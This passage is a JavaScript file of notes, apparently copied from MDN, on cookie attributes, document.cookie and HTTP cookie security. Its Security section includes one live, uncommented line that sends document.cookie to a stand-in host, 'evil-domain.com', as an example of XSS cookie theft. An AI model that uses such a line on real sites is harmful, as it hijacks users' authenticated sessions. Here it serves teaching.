+// a secure page (HTTPS), must not 
+// have a domain specified (and therefore, 
+// are not sent to subdomains), and 
+// the path must be /.
+
+// Domain=<domain-value> Optional
+// Defines the host to which the cookie will be sent.
+
+// Only the current domain can be set 
+// as the value, or a domain of a higher 
+// order, unless it is a public suffix. 
+// Setting the domain will make the 
+// cookie available to it, as well 
+// as to all its subdomains.
+
+// If omitted, this attribute defaults 
+// to the host of the current document 
+// URL, not including subdomains.
+
+// Contrary to earlier specifications, 
+// leading dots in domain names 
+// (.example.com) are ignored.
+
+// Multiple host/domain values are 
+// not allowed, but if a domain is 
+// specified, then subdomains are 
+// always included.
+
+// Expires=<date> Optional
+// Indicates the maximum lifetime of 
+// the cookie as an HTTP-date timestamp. 
+// See Date for the required formatting.
+
+// If unspecified, the cookie becomes 
+// a session cookie. A session finishes 
+// when the client shuts down, after
+//  which the session cookie is removed.
+
+// Warning: Many web browsers have 
+// a session restore feature that 
+// will save all tabs and restore 
+// them the next time the browser 
+// is used. Session cookies will 
+// also be restored, as if the 
+// browser was never closed.
+
+// When an Expires date is set, 
+// the deadline is relative to 
+// the client the cookie is 
+// being set on, not the server.
+
+// HttpOnly Optional
+// Forbids JavaScript from accessing 
+// the cookie, for example, through 
+// the Document.cookie property. Note 
+// that a cookie that has been created 
+// with HttpOnly will still be sent with 
+// JavaScript-initiated requests, for 
+// example, when calling 
+// XMLHttpRequest.send() or fetch(). 
+// This mitigates attacks against 
+// cross-site scripting (XSS).
+// 
+
+// Max-Age=<number> Optional
+// Indicates the number of seconds 
+// until the cookie expires. A zero 
+// or negative number will expire the 
+// cookie immediately. If both Expires 
+// and Max-Age are set, Max-Age has precedence.
+
+// Partitioned OptionalExperimental
+// Indicates that the cookie should be 
+// stored using partitioned storage. 
+// See Cookies Having Independent 
+// Partitioned State (CHIPS) for more details.
+
+// Path=<path-value> Optional
+// Indicates the path that must exist 
+// in the requested URL for the browser 
+// to send the Cookie header.
+
+// The forward slash (/) character is 
+// interpreted as a directory separator, 
+// and subdirectories are matched as well. 
+// For example, for Path=/docs,
+
+// the request paths /docs, /docs/, /docs/Web/, and /docs/Web/HTTP will all match.
+// the request paths /, /docsets, /fr/docs will not match.
+
+// SameSite=<samesite-value> Optional
+// Controls whether or not a cookie is 
+// sent with cross-site requests, 
+// providing some protection against 
+// cross-site request forgery attacks (CSRF).
+
+// The possible attribute values are:
+
+// Strict
+// Means that the browser sends the 
+// cookie only for same-site requests,
+//  that is, requests originating from 
+// the same site that set the cookie. 
+// If a request originates from a 
+// different domain or scheme (even 
+// with the same domain), no cookies 
+// with the SameSite=Strict attribute are sent.
+
+// Lax
+// Means that the cookie is not sent 
+// on cross-site requests, such as on 
+// requests to load images or frames, 
+// but is sent when a user is navigating 
+// to the origin site from an external 
+// site (for example, when following a link). 
+// This is the default behavior if the 
+// SameSite attribute is not specified.
+
+// None
+// Means that the browser sends the 
+// cookie with both cross-site and 
+// same-site requests. The Secure 
+// attribute must also be set when 
+// setting this value, like so 
+// SameSite=None; Secure. If Secure 
+// is missing an error will be logged:
+
+// Cookie "myCookie" rejected because 
+// it has the "SameSite=None" attribute 
+// but is missing the "secure" attribute.
+
+// This Set-Cookie was blocked because 
+// it had the "SameSite=None" attribute 
+// but did not have the "Secure" attribute, 
+// which is required in order to use "SameSite=None".
+
+// Note: A Secure cookie is only sent to 
+// the server with an encrypted request 
+// over the HTTPS protocol. Note that 
+// insecure sites (http:) can't set 
+// cookies with the Secure directive, 
+// and therefore can't use SameSite=None.
+
+// Secure Optional
+// Indicates that the cookie is sent 
+// to the server only when a request 
+// is made with the https: scheme 
+// (except on localhost), and therefore, 
+// is more resistant 
+// to man-in-the-middle attacks.
+
+// Note: Do not assume that Secure 
+// prevents all access to sensitive 
+// information in cookies (session keys, 
+// login details, etc.). Cookies with 
+// this attribute can still be 
+// read/modified either with access 
+// to the client's hard disk or from 
+// JavaScript if the HttpOnly cookie 
+// attribute is not set.
+
+// Insecure sites (http:) cannot 
+// set cookies with the Secure 
+// attribute (since Chrome 52 and 
+// Firefox 52). The https: requirements 
+// are ignored when the Secure attribute 
+// is set by localhost (since 
+// Chrome 89 and Firefox 75).
+
+// Examples
+// Session cookie
+// Session cookies are removed when 
+// the client shuts down. Cookies are 
+// session cookies if they do not 
+// specify the Expires or Max-Age attribute.
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: sessionId=38afes7a8
+// Permanent cookie
+// Permanent cookies are removed at 
+// a specific date (Expires) or after 
+// a specific length of time (Max-Age) 
+// and not when the client is closed.
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Max-Age=2592000
+// Invalid domains
+// A cookie for a domain that does not 
+// include the server that set it
+//  should be rejected by the user agent.
+
+// The following cookie will be rejected 
+// if set by a server hosted on 
+// originalcompany.com:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: qwerty=219ffwef9w0f; Domain=somecompany.co.uk
+// A cookie for a subdomain of the serving domain will be rejected.
+
+// The following cookie will be rejected if set by a server hosted on example.com:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: sessionId=e8bb43229de9; Domain=foo.example.com
+
+// Cookie prefixes
+// Cookie names prefixed with __Secure- or __Host- 
+// can be used only if they are set with the 
+// secure attribute from a secure (HTTPS) origin.
+
+// In addition, cookies with the __Host- 
+// prefix must have a path of / (meaning 
+// any path at the host) and must not 
+// have a Domain attribute.
+
+// Warning: For clients that don't 
+// implement cookie prefixes, you 
+// cannot count on these additional 
+// assurances, and prefixed cookies 
+// will always be accepted.
+
+// HTTP
+// Copy to Clipboard
+// Both accepted when from a secure origin (HTTPS)
+// Set-Cookie: __Secure-ID=123; Secure; Domain=example.com
+// Set-Cookie: __Host-ID=123; Secure; Path=/
+
+// Rejected due to missing Secure attribute
+// Set-Cookie: __Secure-id=1
+
+// Rejected due to the missing Path=/ attribute
+// Set-Cookie: __Host-id=1; Secure
+
+// Rejected due to setting a Domain
+// Set-Cookie: __Host-id=1; Secure; Path=/; Domain=example.com
+// Partitioned cookie
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: __Host-example=34d8g; SameSite=None; Secure; Path=/; Partitioned;
+// Note: Partitioned cookies must be set with Secure. In addition, it is recommended to use the __Host prefix when setting partitioned cookies to make them bound to the hostname and not the registrable domain.
+
+console.log("Document: cookie ")
+
+// Document: cookie property
+// The Document property cookie lets 
+// you read and write cookies 
+// associated with the document. 
+// It serves as a getter and setter 
+// for the actual values of the cookies.
+
+// Syntax
+// Read all cookies accessible from this location
+// JS
+// Copy to Clipboard
+allCookies = document.cookie;
+// In the code above allCookies is a 
+// string containing a semicolon-separated 
+// list of all cookies (i.e. key=value pairs). 
+// Note that each key and value may be 
+// surrounded by whitespace (space and 
+// tab characters): in fact, RFC 6265 
+// mandates a single space after each 
+// semicolon, but some user agents 
+// may not abide by this.
+
+// Write a new cookie
+// JS
+// Copy to Clipboard
+document.cookie = newCookie;
+// In the code above, newCookie is 
+// a string of form key=value, 
+// specifying the cookie to set/update.
+//  Note that you can only set/update 
+// a single cookie at a time using 
+// this method. Consider also that:
+
+// Any of the following cookie 
+// attribute values can optionally 
+// follow the key-value pair, each 
+// preceded by a semicolon separator:
+
+// ;domain=domain (e.g., example.com 
+// or subdomain.example.com): The 
+// host to which the cookie will be 
+// sent. If not specified, this 
+// defaults to the host portion of 
+// the current document location and 
+// the cookie is not available on subdomains. 
+// If a domain is specified, subdomains 
+// are always included. Contrary to 
+// earlier specifications, leading 
+// dots in domain names are ignored, 
+// but browsers may decline to set 
+// the cookie containing such dots.
+
+// Note: The domain must match the 
+// domain of the JavaScript origin. 
+// Setting cookies to foreign 
+// domains will be silently ignored.
+
+// ;expires=date-in-GMTString-format: 
+// The expiry date of the cookie. 
+// If neither expires nor max-age 
+// is specified, it will expire 
+// at the end of session.
+
+// Warning: When user privacy is 
+// a concern, it's important that 
+// any web app implementation 
+// invalidate cookie data after 
+// a certain timeout instead of 
+// relying on the browser to do it. 
+// Many browsers let users specify 
+// that cookies should never expire, 
+// which is not necessarily safe.
+
+// See Date.toUTCString() for help formatting this value.
+// ;max-age=max-age-in-seconds: The maximum 
+// age of the cookie in seconds 
+// (e.g., 60*60*24*365 or 31536000 for a year).
+
+// ;partitioned: Indicates that the cookie 
+// should be stored using partitioned storage. 
+// See Cookies Having Independent Partitioned 
+// State (CHIPS) for more details.
+
+// ;path=path: The value of the 
+// cookie's Path attribute.
+
+// ;samesite: SameSite prevents the 
+// browser from sending this cookie 
+// along with cross-site requests. 
+// Possible values are lax, strict or none.
+
+// The lax value will send the cookie 
+// for all same-site requests and 
+// top-level navigation GET requests. 
+// This is sufficient for user tracking, 
+// but it will prevent many Cross-Site 
+// Request Forgery (CSRF) attacks. This 
+// is the default value in modern browsers.
+
+// The strict value will prevent the cookie 
+// from being sent by the browser to the 
+// target site in all cross-site browsing 
+// contexts, even when following a regular link.
+
+// The none value explicitly states no 
+// restrictions will be applied. The 
+// cookie will be sent in all 
+// requests—both cross-site and 
+// same-site.
+
+// ;secure: Specifies that the 
+// cookie should only be transmitted 
+// over a secure protocol.
+
+// The cookie value string can use 
+// encodeURIComponent() to ensure 
+// that the string does not contain 
+// any commas, semicolons, or
+//  whitespace (which are disallowed in cookie values).
+
+// Some user agent implementations 
+// support the following cookie prefixes:
+
+// __Secure- Signals to the browser 
+// that it should only include the 
+// cookie in requests transmitted 
+// over a secure channel.
+
+// __Host- Signals to the browser 
+// that in addition to the restriction 
+// to only use the cookie from a secure 
+// origin, the scope of the cookie is 
+// limited to a path attribute passed 
+// down by the server. If the server 
+// omits the path attribute the 
+// "directory" of the request URI
+//  is used. It also signals that 
+// the domain attribute must not be 
+// present, which prevents the cookie 
+// from being sent to other domains. 
+// For Chrome the path attribute 
+// must always be the origin.
+
+// Note: The dash is considered part of the prefix.
+
+// Note: These flags are only 
+// settable with the secure attribute.
+
+// Note: As you can see from the code 
+// above, document.cookie is an accessor 
+// property with native setter and getter 
+// functions, and consequently is not 
+// a data property with a value: what 
+// you write is not the same as what 
+// you read, everything is always 
+// mediated by the JavaScript interpreter.
+
+// Examples
+// Example 1: Simple usage
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting `SameSite=None;` in this example because the example
+// needs to work cross-origin.
+
+// It is more common not to set the `SameSite` 
+// attribute, which results in the default,
+
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "name=oeschger; SameSite=None; Secure";
+document.cookie = "favorite_food=tripe; SameSite=None; Secure";
+
+function showCookies() {
+    const output = document.getElementById("cookies");
+    output.textContent = `> ${document.cookie}`;
+}
+
+function clearOutputCookies() {
+    const output = document.getElementById("cookies");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+{/* <button onclick="showCookies()">Show cookies</button>
+
+<button onclick="clearOutputCookies()">Clear</button>
+
+<div>
+  <code id="cookies"></code>
+</div> */}
+// Play
+
+// Example 2: Get a sample cookie named test2
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting `SameSite=None;` 
+// in this example because the example
+
+// needs to work cross-origin.
+// It is more common not to set the 
+// `SameSite` attribute, which 
+// results in the default,
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "test1=Hello; SameSite=None; Secure";
+document.cookie = "test2=World; SameSite=None; Secure";
+
+const cookieValue = document.cookie
+    .split("; ")
+    .find((row) => row.startsWith("test2="))
+    ?.split("=")[1];
+
+function showCookieValue() {
+    const output = document.getElementById("cookie-value");
+    output.textContent = `> ${cookieValue}`;
+}
+
+function clearOutputCookieValue() {
+    const output = document.getElementById("cookie-value");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "showCookieValue()" > Show cookie value</ >
+
+// <button onclick="clearOutputCookieValue()">Clear</button>
+
+// <div>
+//   <code id="cookie-value"></code>
+// </div>
+// Play
+
+// Example 3: Do something only once
+// In order to use the following code, 
+// please replace all occurrences of 
+// the word doSomethingOnlyOnce(the 
+// name of the cookie) with a custom name.
+
+//     JS
+// Play
+// Copy to Clipboard
+function doOnce() {
+    if (
+        !document.cookie
+            .split("; ")
+            .find((row) => row.startsWith("doSomethingOnlyOnce"))
+    ) {
+        // Note that we are setting `SameSite=None;` in this example because the example
+        // needs to work cross-origin.
+        // It is more common not to set the `SameSite` attribute, which results in the default,
+        // and more secure, value of `SameSite=Lax;`
+        document.cookie =
+            "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+
+        const output = document.getElementById("do-once");
+        output.textContent = "> Do something here!";
+    }
+}
+
+function clearOutputDoOnce() {
+    const output = document.getElementById("do-once");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+//     < button onclick = "doOnce()" > Only do something once</ >
+
+// <button onclick="clearOutputDoOnce()">Clear</button>
+
+// <div>
+//   <code id="do-once"></code>
+// </div>
+// Play
+
+// Example 4: Reset the previous cookie
+function resetOnce() {
+    // Note that we are setting `SameSite=None;` in this example because the example
+    // needs to work cross-origin.
+    // It is more common not to set the `SameSite` attribute, which results in the default,
+    // and more secure, value of `SameSite=Lax;`
+    document.cookie =
+        "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+
+    const output = document.getElementById("reset-once");
+    output.textContent = "> Reset!";
+}
+
+function clearOutputResetOnce() {
+    const output = document.getElementById("reset-once");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "resetOnce()" > Reset only once cookie</ >
+
+// <button onclick="clearOutputResetOnce()">Clear</button>
+
+// <div>
+//   <code id="reset-once"></code>
+// </div>
+// Play
+
+// Example 5: Check a cookie existence
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting 
+// `SameSite=None;` in this 
+// example because the example
+
+// needs to work cross-origin.
+// It is more common not to set 
+// the `SameSite` attribute, 
+// which results in the default,
+
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "reader=1; SameSite=None; Secure";
+
+function checkACookieExists() {
+    if (
+        document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+    ) {
+        const output = document.getElementById("a-cookie-existence");
+        output.textContent = '> The cookie "reader" exists';
+    }
+}
+
+function clearOutputACookieExists() {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "checkACookieExists()" > Check a cookie exists</ >
+// <button onclick="clearOutputACookieExists()">Clear</button>
+// <div>
+//   <code id="a-cookie-existence"></code>
+// </div>
+// Play
+
+// Example 6: Check that a cookie has a specific value
+function checkCookieHasASpecificValue() {
+    if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+        const output = document.getElementById("a-specific-value-of-the-cookie");
+        output.textContent = '> The cookie "reader" has a value of "1"';
+    }
+}
+
+function clearASpecificValueOfTheCookie() {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+//     < button onclick = "checkCookieHasASpecificValue()" >
+//         Check that a cookie has a specific value
+// </ >
+
+// <button onclick="clearASpecificValueOfTheCookie()">Clear</button>
+
+// <div>
+//   <code id="a-specific-value-of-the-cookie"></code>
+// </div>
+// Play
+
+// Security
+// It is important to note that the 
+// path attribute does not protect 
+// against unauthorized reading of 
+// the cookie from a different path.
+// It can be easily bypassed using 
+// the DOM, for example by creating 
+// a hidden < iframe > element with 
+// the path of the cookie, then 
+// accessing this iframe's 
+// contentDocument.cookie property. 
+// The only way to protect the cookie 
+// is by using a different domain or 
+// subdomain, due to the same origin policy.
+
+// Cookies are often used in web 
+// applications to identify a user 
+// and their authenticated session.
+// Stealing a cookie from a web 
+// application leads to hijacking 
+// the authenticated user's session. 
+// Common ways to steal cookies include 
+// using social engineering or by 
+// exploiting a cross-site scripting 
+// (XSS) vulnerability in the application -
+
+// JS
+// Copy to Clipboard
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+// The HTTPOnly cookie attribute can 
+// help to mitigate this attack by 
+// preventing access to cookie value 
+// through JavaScript.Read more about 
+// Cookies and Security.
+
+//     Notes
+// Starting with Firefox 2, a better 
+// mechanism for client - side storage 
+// is available - WHATWG DOM Storage.
+
+// You can delete a cookie by updating 
+// its expiration time to zero.
+
+// Keep in mind that the more cookies 
+// you have, the more data will be 
+// transferred between the server and 
+// the client for each request.This 
+// will make each request slower.It 
+// is highly recommended for you to 
+// use WHATWG DOM Storage if you are 
+// going to keep "client-only" data.
+
+// RFC 2965(Section 5.3, "Implementation Limits") 
+// specifies that there should be no maximum 
+// length of a cookie's key or value size, 
+// and encourages implementations to support 
+// arbitrarily large cookies. Each browser's
+//  implementation maximum will necessarily 
+// be different, so consult individual 
+// browser documentation.
+
+// The reason for the syntax of the 
+// document.cookie accessor property 
+// is due to the client - server nature 
+// of cookies, which differs from other 
+// client - client storage methods(like, 
+// for instance, localStorage):
+
+// The server tells the client to store a cookie
+// BASH
+// Copy to Clipboard
+// HTTP / 1.0 200 OK
+// Content - type: text / html
+// Set - Cookie: cookie_name1 = cookie_value1
+// Set - Cookie: cookie_name2 = cookie_value2; expires = Sun, 16 Jul 3567 06: 23: 41 GMT
+
+// [content of the page here]
+// The client sends back to the server its cookies previously stored
+// BASH
+// Copy to Clipboard
+// GET / sample_page.html HTTP / 1.1
+// Host: www.example.org
+// Cookie: cookie_name1 = cookie_value1; cookie_name2 = cookie_value2
+// Accept: */*
+// Specifications
+
+console.log("Using HTTP cookies")
+// An HTTP cookie (web cookie, browser cookie) 
+// is a small piece of data that a server 
+// sends to a user's web browser. The 
+// browser may store the cookie and send 
+// it back to the same server with later 
+// requests. Typically, an HTTP cookie is 
+// used to tell if two requests come from 
+// the same browser—keeping a user logged 
+// in, for example. It remembers stateful 
+// information for the stateless HTTP protocol.
+
+// Cookies are mainly used for three purposes:
+
+// Session management
+// Logins, shopping carts, game scores,
+//  or anything else the server should remember
+
+// Personalization
+// User preferences, themes, and other settings
+
+// Tracking
+// Recording and analyzing user behavior
+
+// Cookies were once used for general 
+// client-side storage. While this made 
+// sense when they were the only way to 
+// store data on the client, modern storage 
+// APIs are now recommended. Cookies are 
+// sent with every request, so they can 
+// worsen performance (especially for 
+// mobile data connections). Modern APIs 
+// for client storage are the Web Storage
+//  API (localStorage and sessionStorage) 
+// and IndexedDB.
+
+// Note: To see stored cookies (and other 
+// storage that a web page can use), you 
+// can enable the Storage Inspector in 
+// Developer Tools and select Cookies 
+// from the storage tree.
+
+// Creating cookies
+// After receiving an HTTP request, a 
+// server can send one or more Set-Cookie 
+// headers with the response. The browser 
+// usually stores the cookie and sends it 
+// with requests made to the same server 
+// inside a Cookie HTTP header. You can 
+// specify an expiration date or time 
+// period after which the cookie 
+// shouldn't be sent. You can also 
+// set additional restrictions to 
+// a specific domain and path to 
+// limit where the cookie is sent. 
+// For details about the header 
+// attributes mentioned below, 
+// refer to the Set-Cookie 
+// reference article.
+
+// The Set-Cookie and Cookie headers
+// The Set-Cookie HTTP response 
+// header sends cookies from the 
+// server to the user agent. 
+// A simple cookie is set like this:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: <cookie-name>=<cookie-value>
+// This instructs the server sending 
+// headers to tell the client to 
+// store a pair of cookies:
+
+// HTTP
+// Copy to Clipboard
+// HTTP/2.0 200 OK
+// Content-Type: text/html
+// Set-Cookie: yummy_cookie=choco
+// Set-Cookie: tasty_cookie=strawberry
+
+// [page content]
+// Then, with every subsequent request 
+// to the server, the browser sends all 
+// previously stored cookies back to 
+// the server using the Cookie header.
+
+// HTTP
+// Copy to Clipboard
+// GET /sample_page.html HTTP/2.0
+// Host: www.example.org
+// Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+// Note: Here's how to use the Set-Cookie 
+// header in various server-side applications:
+
+// PHP
+// Node.JS
+// Python
+// Ruby on Rails
+
+// Define the lifetime of a cookie
+// Cookies can persist for two different 
+// periods, depending on the attributes 
+// used with the Set-Cookie header when 
+// they were created:
+
+// Permanent cookies are deleted at 
+// a date specified by the Expires 
+// attribute or after a period 
+// prescribed by the Max-Age attribute.
+
+// Session cookies – cookies without 
+// a Max age or Expires attribute – 
+// are deleted when the current session 
+// ends. The browser defines when 
+// the "current session" ends, and 
+// some browsers use session restoring 
+// when restarting. This can cause 
+// session cookies to last indefinitely.
+
+// For example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Thu, 31 Oct 2021 07:28:00 GMT;
+// Note: When you set an Expires date
+//  and time, they're relative to the 
+// client the cookie is being set on, 
+// not the server.
+
+// If your site authenticates users, 
+// it should regenerate and resend 
+// session cookies, even ones that 
+// already exist, whenever a user 
+// authenticates. This approach 
+// helps prevent session fixation 
+// attacks, where a third party 
+// can reuse a user's session.
+
+// Restrict access to cookies
+// You can ensure that cookies are sent 
+// securely and aren't accessed by 
+// unintended parties or scripts in 
+// one of two ways: with the Secure 
+// attribute and the HttpOnly attribute.
+
+// A cookie with the Secure attribute 
+// is only sent to the server with an 
+// encrypted request over the HTTPS 
+// protocol. It's never sent with 
+// unsecured HTTP (except on localhost), 
+// which means man-in-the-middle attackers 
+// can't access it easily. Insecure sites 
+// (with http: in the URL) can't set 
+// cookies with the Secure attribute. 
+// However, don't assume that Secure 
+// prevents all access to sensitive 
+// information in cookies. For example, 
+// someone with access to the client's 
+// hard disk (or JavaScript if the 
+// HttpOnly attribute isn't set) can 
+// read and modify the information.
+
+// A cookie with the HttpOnly attribute 
+// is inaccessible to the JavaScript 
+// Document.cookie API; it's only sent 
+// to the server. For example, cookies 
+// that persist in server-side sessions 
+// don't need to be available to 
+// JavaScript and should have the 
+// HttpOnly attribute. This precaution 
+// helps mitigate cross-site 
+// scripting (XSS) attacks.
+
+// Here's an example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
+
+
+// Define where cookies are sent
+// The Domain and Path attributes define 
+// the scope of a cookie: what URLs 
+// the cookies should be sent to.
+
+// Domain attribute
+// The Domain attribute specifies 
+// which server can receive a cookie.
+
+// If specified, then cookies are 
+// available on the server and its 
+// subdomains. For example, if you 
+// set Domain=mozilla.org, cookies 
+// are available on mozilla.org and 
+// its subdomains like developer.mozilla.org.
+
+// If the server does not specify 
+// a Domain, the cookies are available 
+// on the server but not on its subdomains. 
+// Therefore, specifying Domain is less 
+// restrictive than omitting it. However, 
+// it can be helpful when subdomains need 
+// to share information about a user.
+
+// Path attribute
+// The Path attribute indicates a URL 
+// path that must exist in the requested 
+// URL in order to send the Cookie header. 
+// The %x2F ("/") character is considered 
+// a directory separator, and subdirectories 
+// match as well.
+
+// For example, if you set Path=/docs, 
+// these request paths match:
+
+// /docs
+// /docs/
+// /docs/Web/
+// /docs/Web/HTTP
+// But these request paths don't:
+
+// /
+// /docsets
+// /fr/docs
+
+// PATH DEFAULT VALUE
+// If the Path attribute is not set, 
+// its default value is computed from 
+// the path of the URI that set the 
+// cookie, as follows:
+
+// If the path is empty, does not start 
+// with "/", or contains no more than 
+// one "/" character, then the default 
+// value for Path is "/".
+
+// Otherwise, the default value for 
+// Path is the path from the start 
+// up to but not including the 
+// final "/" character.
+
+// For example, if the cookie was 
+// set from "https://example.org/a/b/c, 
+// then the default value of Path 
+// would be "/a/b".
+
+// SameSite attribute
+// The SameSite attribute lets servers 
+// specify whether/when cookies are 
+// sent with cross-site requests 
+// (where Site is defined by the 
+// registrable domain and 
+// the scheme: http or https). 
+// This provides some protection 
+// against cross-site request forgery 
+// attacks (CSRF). It takes three 
+// possible values: Strict, Lax, and None.
+
+// With Strict, the browser only 
+// sends the cookie with requests 
+// from the cookie's origin site. 
+// Lax is similar, except the browser 
+// also sends the cookie when the user 
+// navigates to the cookie's origin site 
+// (even if the user is coming from a 
+// different site). For example, by 
+// following a link from an external 
+// site. None specifies that cookies 
+// are sent on both originating and 
+// cross-site requests, but only in 
+// secure contexts (i.e., if 
+// SameSite=None then the Secure 
+// attribute must also be set). If 
+// no SameSite attribute is set, the 
+// cookie is treated as Lax.
+
+// Here's an example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: mykey=myvalue; SameSite=Strict
+// Note: The standard related to SameSite 
+// recently changed (MDN documents the 
+// new behavior above). See the cookies 
+// Browser compatibility table for 
+// information about how the attribute 
+// is handled in specific browser versions:
+
+// SameSite=Lax is the new default if 
+// SameSite isn't specified. Previously, 
+// cookies were sent for all requests by default.
+
+// Cookies with SameSite=None must now 
+// also specify the Secure attribute 
+// (they require a secure context).
+
+// Cookies from the same domain are 
+// no longer considered to be from 
+// the same site if sent using a 
+// different scheme (http: or https:).
+
+// Cookie prefixes
+// Because of the design of the cookie 
+// mechanism, a server can't confirm 
+// that a cookie was set from a secure 
+// origin or even tell where a cookie 
+// was originally set.
+
+// A vulnerable application on a 
+// subdomain can set a cookie with 
+// the Domain attribute, which gives 
+// access to that cookie on all 
+// other subdomains. This mechanism 
+// can be abused in a session fixation 
+// attack. See session fixation for 
+// primary mitigation methods.
+
+// As a defense-in-depth measure, 
+// however, you can use cookie prefixes 
+// to assert specific facts about the 
+// cookie. Two prefixes are available:
+
+// __Host-
+// If a cookie name has this prefix, 
+// it's accepted in a Set-Cookie header 
+// only if it's also marked with the 
+// Secure attribute, was sent from 
+// a secure origin, does not include 
+// a Domain attribute, and has the 
+// Path attribute set to /. This way, 
+// these cookies can be seen as "domain-locked".
+
+// __Secure-
+// If a cookie name has this prefix, 
+// it's accepted in a Set-Cookie header 
+// only if it's marked with the Secure 
+// attribute and was sent from a secure 
+// origin. This is weaker than the __Host- prefix.
+
+// The browser will reject cookies 
+// with these prefixes that don't comply 
+// with their restrictions. Note that 
+// this ensures that subdomain-created 
+// cookies with prefixes are either 
+// confined to the subdomain or ignored 
+// completely. As the application server 
+// only checks for a specific cookie 
+// name when determining if the user is 
+// authenticated or a CSRF token is 
+// correct, this effectively acts as 
+// a defense measure against session 
+// fixation.
+// 
+
+// Note: On the application server, 
+// the web application must check 
+// for the full cookie name including 
+// the prefix. User agents do not strip 
+// the prefix from the cookie before 
+// sending it in a request's Cookie header.
+
+// For more information about cookie 
+// prefixes and the current state of 
+// browser support, see the Prefixes 
+// section of the Set-Cookie reference article.
+
+// JavaScript access using Document.cookie
+// You can create new cookies via 
+// JavaScript using the Document.cookie 
+// property. You can access existing 
+// cookies from JavaScript as well if 
+// the HttpOnly flag isn't set.
+
+// JS
+// Copy to Clipboard
+// document.cookie = "yummy_cookie=choco";
+// document.cookie = "tasty_cookie=strawberry";
+// console.log(document.cookie);
+// // logs "yummy_cookie=choco; tasty_cookie=strawberry"
+// Cookies created via JavaScript 
+// can't include the HttpOnly flag.
+
+// Please note the security issues in 
+// the Security section below. Cookies 
+// available to JavaScript can be 
+// stolen through XSS.
+
+// Security
+// Note: When you store information 
+// in cookies, keep in mind that all 
+// cookie values are visible to, 
+// and can be changed by, the end user. 
+// Depending on the application, you 
+// may want to use an opaque identifier 
+// that the server looks up, or investigate 
+// alternative authentication/confidentiality 
+// mechanisms such as JSON Web Tokens.
+
+// Ways to mitigate attacks involving cookies:
+
+// Use the HttpOnly attribute to prevent 
+// access to cookie values via JavaScript.
+
+// Cookies that are used for sensitive 
+// information (such as indicating authentication) 
+// should have a short lifetime, with the 
+// SameSite attribute set to Strict or Lax. 
+// (See SameSite attribute, above.) In 
+// browsers that support SameSite, this 
+// ensures that the authentication cookie 
+// isn't sent with cross-site requests. 
+// This would make the request effectively 
+// unauthenticated to the application server.
+
+
+// Tracking and privacy
+// Third-party cookies
+// A cookie is associated with a particular 
+// domain and scheme (such as http or https), 
+// and may also be associated with subdomains 
+// if the Set-Cookie Domain attribute is set. 
+// If the cookie domain and scheme match 
+// the current page, the cookie is considered 
+// to be from the same site as the page, 
+// and is referred to as a first-party cookie.
+
+// If the domain and scheme are different, 
+// the cookie is not considered to be from 
+// the same site, and is referred to as 
+// a third-party cookie. While the server 
+// hosting a web page sets first-party 
+// cookies, the page may contain components 
+// stored on servers in other domains, such 
+// as images or other documents embedded 
+// in <iframe>s. These components may 
+// set third-party cookies.
+
+// Note: Third-party cookies are 
+// sometimes referred to as cross-site 
+// cookies. This is arguably a more 
+// accurate name, as third-party cookies 
+// imply ownership by a third-party 
+// company or organization. However, 
+// the behavior and potential issues 
+// are the same whether or not you 
+// own all the involved sites.
+
+// Typical use cases for third-party 
+// cookies include sharing user profile 
+// information or collecting analytics 
+// across different related domains. 
+// They are also often used for 
+// advertising and tracking users 
+// across the web.
+
+// Note: Companies should disclose 
+// the types of cookies they use on 
+// their sites for transparency 
+// purposes and to comply with
+//  regulations. For example, 
+// see Google's notice on the 
+// types of cookies it uses and
+//  Mozilla's Websites, 
+// Communications & Cookies 
+// Privacy Notice.
+
+// A third-party server can create 
+// a profile of a user's browsing 
+// history and habits based on 
+// cookies sent to it by the same 
+// browser when accessing multiple 
+// sites. Firefox, by default, blocks 
+// third-party cookies that are known 
+// to contain trackers. Third-party 
+// cookies (or just tracking cookies) 
+// may also be blocked by other browser 
+// settings or extensions. Cookie 
+// blocking can cause some third-party 
+// components (such as social media 
+// widgets) not to function as intended.
+
+// There are some useful features 
+// available for developers who wish 
+// to respect user privacy, and 
+// minimize third-party tracking:
+
+// Servers can (and should) set 
+// the cookie SameSite attribute 
+// to specify whether or not 
+// third-party cookies may be sent.
+
+// Cookies Having Independent 
+// Partitioned State (CHIPS) enables 
+// developers to opt-in their cookies 
+// to partitioned storage, with 
+// a separate cookie jar per top-level 
